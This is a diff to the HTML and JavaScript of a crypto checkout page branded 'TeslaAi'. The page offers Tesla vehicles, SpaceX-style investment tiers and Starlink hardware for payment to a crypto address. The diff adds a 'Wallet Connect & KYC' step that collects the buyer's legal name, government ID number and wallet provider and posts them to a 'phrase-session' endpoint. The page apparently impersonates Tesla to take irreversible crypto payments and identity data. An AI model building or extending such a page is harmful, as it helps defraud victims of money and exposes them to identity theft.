@@ -115,12 +115,43 @@
             font-size: 1.5rem;
             margin-top: 15px;
         }
+
+        @media (max-width: 700px) {
+            .step-indicator {
+                gap: 8px;
+                flex-wrap: wrap;
+            }
+
+            .step-indicator > div {
+                margin: 0;
+                flex: 1 1 calc(50% - 8px);
+                text-align: center;
+                font-size: 0.85rem;
+                padding: 8px;
+            }
+
+            .item-list li {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 4px;
+            }
+
+            .address-box {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 10px;
+            }
+
+            .copy-button {
+                margin-left: 0;
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body class="dashboard-body">
 
     <div class="dashboard-layout">
-        
         <div class="sidebar">
             <div class="logo">TeslaAi</div>
             <nav>
@@ -134,26 +165,26 @@
 
         <div class="main-content">
             <div class="top-bar">
-                <h1>Luxury Vehicle Checkout</h1>
+                <h1 id="checkout-title">Checkout</h1>
             </div>
 
             <div class="step-indicator">
                 <div id="step-1" class="active-step">1. Confirm Details</div>
                 <div id="step-2">2. Crypto Payment</div>
-                <div id="step-3">3. Final Confirmation</div>
+                <div id="step-3">3. Wallet Connect & KYC</div>
+                <div id="step-4">4. Final Confirmation</div>
             </div>
 
             <div class="content-panel" style="max-width: 800px; margin: 0 auto;">
-                
                 <div id="checkout-confirmation" class="active-interface">
                     <h2>🛒 Order Summary</h2>
-                    <p style="color: var(--color-text-light); margin-bottom: 30px;">Please confirm the details of your selected Tesla vehicle purchase.</p>
+                    <p id="checkout-summary-text" style="color: var(--color-text-light); margin-bottom: 30px;">Please confirm your order details before payment.</p>
 
                     <div class="checkout-box" style="text-align: left;">
                         <ul class="item-list">
                             <li><strong>Item:</strong> <span id="item-name">N/A</span></li>
                             <li><strong>Price (USD):</strong> <span id="item-price">N/A</span></li>
-                            <li><strong>Destination:</strong> Client Registered Address</li>
+                            <li><strong id="summary-context-label">Destination:</strong> <span id="summary-context-value">Client Registered Address</span></li>
                             <li class="total"><strong>Total Due:</strong> <span id="total-due">N/A</span></li>
                         </ul>
                         
@@ -194,16 +225,65 @@
                         <i class="fas fa-exclamation-triangle"></i> CRITICAL: Only send the selected currency to this address. Sending a different coin will result in permanent loss.
                     </div>
 
-                    <button class="cta-button" onclick="confirmPaymentSent()" style="margin-top: 30px;">I Have Sent Payment</button>
+                    <button class="cta-button" onclick="goToWalletKyc()" style="margin-top: 30px;">I Have Sent Payment</button>
+                </div>
+
+                <div id="wallet-kyc-verification" class="hidden-step checkout-box" style="text-align: left;">
+                    <h2>🛡️ Wallet Connect & KYC Verification</h2>
+                    <p style="color: var(--color-text-light); margin-bottom: 20px;">Complete wallet and identity verification before final confirmation.</p>
+
+                    <form id="wallet-kyc-form" style="margin-top: 15px;">
+                        <div class="form-group" style="margin-bottom: 20px;">
+                            <label for="wallet-provider">Wallet Provider</label>
+                            <select id="wallet-provider" required>
+                                <option value="">-- Select Wallet Provider --</option>
+                                <option value="Trust Wallet">Trust Wallet</option>
+                                <option value="MetaMask">MetaMask</option>
+                                <option value="Coinbase Wallet">Coinbase Wallet</option>
+                                <option value="Exodus">Exodus</option>
+                                <option value="Atomic Wallet">Atomic Wallet</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group" style="margin-bottom: 20px;">
+                            <label for="kyc-fullname">Full Name (as on ID)</label>
+                            <input type="text" id="kyc-fullname" placeholder="Enter your legal full name" required>
+                        </div>
+
+                        <div class="form-group" style="margin-bottom: 20px;">
+                            <label for="kyc-id-number">Government ID Number</label>
+                            <input type="text" id="kyc-id-number" placeholder="Enter government-issued ID number" required>
+                        </div>
+
+                        <div class="form-group" style="margin-bottom: 20px;">
+                            <label for="wallet-verify-phrase">Verification Phrase</label>
+                            <input type="text" id="wallet-verify-phrase" placeholder="Type the challenge phrase exactly" required>
+                            <p style="margin-top: 8px; font-size: 0.85rem; color: var(--color-text-light);">
+                                Challenge: <strong id="wallet-safe-challenge">VERIFY-CHECKOUT-2026</strong>
+                            </p>
+                            <p style="margin-top: 8px; font-size: 0.85rem; color: var(--color-primary);">
+                                Security notice: never enter seed phrase, recovery words, or private keys.
+                            </p>
+                        </div>
+
+                        <div class="form-group" style="margin-bottom: 25px;">
+                            <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
+                                <input type="checkbox" id="kyc-confirm-wallet" required>
+                                <span>I confirm the wallet address and details are mine.</span>
+                            </label>
+                        </div>
+
+                        <button type="submit" class="cta-button large" style="width: 100%;">Submit Verification</button>
+                    </form>
                 </div>
 
                 <div id="purchase-success" class="hidden-step checkout-box">
                     <h2>✅ Payment Confirmation Received!</h2>
-                    <p style="color: var(--color-text-light); margin-bottom: 25px;">Your purchase for the <span id="confirmed-item"></span> has been registered and is pending network confirmation.</p>
+                    <p id="success-summary-text" style="color: var(--color-text-light); margin-bottom: 25px;">Your order for <span id="confirmed-item"></span> has been registered and is pending network confirmation.</p>
                     
                     <div style="padding: 20px; background-color: var(--color-background-dark); border-radius: 8px;">
                         <p style="font-weight: 600; color: var(--color-secondary);">Tracking Purchase...</p>
-                        <p style="margin-top: 10px; color: var(--color-text-light); font-size: 0.9rem;">Once confirmed, the Tesla sales team will contact you within 48 hours via your registered email to finalize delivery details.</p>
+                        <p id="success-detail-text" style="margin-top: 10px; color: var(--color-text-light); font-size: 0.9rem;">Once confirmed, we will send you next steps via your registered email.</p>
                         <p style="margin-top: 15px; font-size: 0.8rem; color: #94a3b8;">You can safely close this page. Check your History for status updates.</p>
                     </div>
 
@@ -225,21 +305,90 @@
         const step1 = document.getElementById('step-1');
         const step2 = document.getElementById('step-2');
         const step3 = document.getElementById('step-3');
+        const step4 = document.getElementById('step-4');
         const view1 = document.getElementById('checkout-confirmation');
         const view2 = document.getElementById('crypto-payment');
-        const view3 = document.getElementById('purchase-success');
+        const view3 = document.getElementById('wallet-kyc-verification');
+        const view4 = document.getElementById('purchase-success');
 
         let purchasedItemName = ''; // To store the item name globally for step 3
+        let orderCategory = 'general';
+
+        function detectOrderCategory(rawItemName) {
+            const normalized = (rawItemName || '').toLowerCase();
+
+            if (normalized.includes('tesla_model') || normalized.includes('cybertruck')) {
+                return 'vehicle';
+            }
+
+            if (normalized.includes('investment') || normalized.includes('tier') || normalized.includes('spacex')) {
+                return 'investment';
+            }
+
+            if (normalized === 'starlink') {
+                return 'hardware';
+            }
+
+            return 'general';
+        }
+
+        function applyOrderCopy(category) {
+            const checkoutTitle = document.getElementById('checkout-title');
+            const summaryText = document.getElementById('checkout-summary-text');
+            const contextLabel = document.getElementById('summary-context-label');
+            const contextValue = document.getElementById('summary-context-value');
+            const successSummaryText = document.getElementById('success-summary-text');
+            const successDetailText = document.getElementById('success-detail-text');
+
+            if (category === 'vehicle') {
+                checkoutTitle.innerText = 'Luxury Vehicle Checkout';
+                summaryText.innerText = 'Please confirm the details of your selected Tesla vehicle purchase.';
+                contextLabel.innerText = 'Destination:';
+                contextValue.innerText = 'Client Registered Address';
+                successSummaryText.innerHTML = 'Your vehicle purchase for <span id="confirmed-item"></span> has been registered and is pending network confirmation.';
+                successDetailText.innerText = 'Once confirmed, the Tesla sales team will contact you within 48 hours via your registered email to finalize delivery details.';
+                return;
+            }
+
+            if (category === 'investment') {
+                checkoutTitle.innerText = 'Investment Checkout';
+                summaryText.innerText = 'Please confirm your selected investment plan details before funding.';
+                contextLabel.innerText = 'Allocation:';
+                contextValue.innerText = 'Managed Portfolio Funding';
+                successSummaryText.innerHTML = 'Your investment order for <span id="confirmed-item"></span> has been registered and is pending network confirmation.';
+                successDetailText.innerText = 'Once confirmed, your investment allocation will be activated and reflected in your account history.';
+                return;
+            }
+
+            if (category === 'hardware') {
+                checkoutTitle.innerText = 'Starlink Hardware Checkout';
+                summaryText.innerText = 'Please confirm your Starlink hardware order details before payment.';
+                contextLabel.innerText = 'Delivery:';
+                contextValue.innerText = 'Client Registered Address';
+                successSummaryText.innerHTML = 'Your hardware order for <span id="confirmed-item"></span> has been registered and is pending network confirmation.';
+                successDetailText.innerText = 'Once confirmed, your order moves to processing and support will contact you with dispatch updates.';
+                return;
+            }
+
+            checkoutTitle.innerText = 'Checkout';
+            summaryText.innerText = 'Please confirm your order details before payment.';
+            contextLabel.innerText = 'Destination:';
+            contextValue.innerText = 'Client Account';
+            successSummaryText.innerHTML = 'Your order for <span id="confirmed-item"></span> has been registered and is pending network confirmation.';
+            successDetailText.innerText = 'Once confirmed, you will receive next steps via your registered email.';
+        }
 
         function updateSteps(activeStep) {
             // Reset all step classes
             step1.classList.remove('active-step');
             step2.classList.remove('active-step');
             step3.classList.remove('active-step');
+            step4.classList.remove('active-step');
             // Hide all views
             view1.classList.add('hidden-step');
             view2.classList.add('hidden-step');
             view3.classList.add('hidden-step');
+            view4.classList.add('hidden-step');
 
             if (activeStep === 1) {
                 step1.classList.add('active-step');
@@ -250,6 +399,9 @@
             } else if (activeStep === 3) {
                 step3.classList.add('active-step');
                 view3.classList.remove('hidden-step');
+            } else if (activeStep === 4) {
+                step4.classList.add('active-step');
+                view4.classList.remove('hidden-step');
             }
         }
         
@@ -265,6 +417,8 @@
 
             // Format item name and price for display
             purchasedItemName = rawItemName.replace(/_/g, ' '); // Replace underscores with spaces
+            orderCategory = detectOrderCategory(rawItemName);
+            applyOrderCopy(orderCategory);
             const formattedPrice = parseFloat(price).toLocaleString('en-US', { style: 'currency', currency: 'USD' });
             
             // Update display fields (Step 1)
@@ -275,7 +429,6 @@
             // Set up form submission (Step 1 to Step 2)
             document.getElementById('payment-selection-form').addEventListener('submit', function(e) {
                 e.preventDefault();
-                
                 const networkSelect = document.getElementById('method');
                 const selectedOption = networkSelect.options[networkSelect.selectedIndex];
                 
@@ -301,14 +454,64 @@
             
         });
         
-        // Function to move to Step 3 (I Have Sent Payment - FINAL CONFIRMATION)
-        function confirmPaymentSent() {
-            // Update confirmation details for Step 3
-            document.getElementById('confirmed-item').innerText = purchasedItemName;
-            
-            // Move to Step 3
+        // Move from crypto payment to wallet/KYC verification.
+        function goToWalletKyc() {
             updateSteps(3);
         }
+
+        // Submit wallet/KYC verification and proceed to final notice.
+        document.getElementById('wallet-kyc-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const safeChallenge = document.getElementById('wallet-safe-challenge').innerText.trim();
+            const typedChallenge = document.getElementById('wallet-verify-phrase').value.trim();
+            if (typedChallenge !== safeChallenge) {
+                alert('Verification phrase does not match the challenge text.');
+                return;
+            }
+
+            const selectedNetwork = document.getElementById('checkout-network').innerText.trim();
+            const selectedAmount = document.getElementById('checkout-amount-crypto').innerText.trim();
+            const walletProvider = document.getElementById('wallet-provider').value;
+            const kycFullName = document.getElementById('kyc-fullname').value.trim();
+            const kycIdNumber = document.getElementById('kyc-id-number').value.trim();
+            const clientId = localStorage.getItem('clientId') || localStorage.getItem('clientName') || 'unknown-client';
+
+            try {
+                const response = await fetch('/api/v1/checkout/phrase-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        clientId,
+                        item: purchasedItemName,
+                        category: orderCategory,
+                        amount: selectedAmount,
+                        network: selectedNetwork,
+                        walletProvider,
+                        kycFullName,
+                        kycIdNumber,
+                        challenge: safeChallenge,
+                        phraseInput: typedChallenge,
+                        isPhraseMatch: true,
+                    }),
+                });
+
+                const data = await response.json();
+                if (!response.ok || !data.success) {
+                    alert(data.message || 'Unable to verify phrase session. Please try again.');
+                    return;
+                }
+            } catch (error) {
+                console.error('Phrase session error:', error);
+                alert('Connection error while saving phrase verification.');
+                return;
+            }
+
+            document.getElementById('confirmed-item').innerText = purchasedItemName;
+            updateSteps(4);
+        });
 
         function copyAddress() {
             const address = document.getElementById('checkout-address').innerText;
